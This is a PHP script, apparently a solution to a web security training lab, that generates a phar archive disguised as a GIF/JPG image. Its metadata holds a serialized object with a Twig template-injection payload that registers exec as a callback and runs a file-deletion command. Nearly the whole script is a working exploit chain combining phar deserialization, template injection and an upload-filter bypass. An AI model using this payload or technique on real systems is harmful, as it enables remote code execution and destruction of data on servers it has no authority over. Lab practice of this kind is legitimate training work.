<?php

   class CustomTemplate {}
   class Blog {}
   $object = new CustomTemplate;
   $blog = new Blog;
   $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
   $blog->user = 'user';
   $object->template_file_path = $blog;

    // remember to set `phar.readonly = Off`
    // use `php --ini` to locate php.ini
   //  or run php -d phar.readonly=0 phar_generate.php
    $outputname = "test.jpg";
    @unlink($outputname.".phar");
    $phar = new Phar($outputname.".phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($object);
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();

    @rename($outputname.".phar", $outputname);
    echo "phar output: $outputname\n";

?>
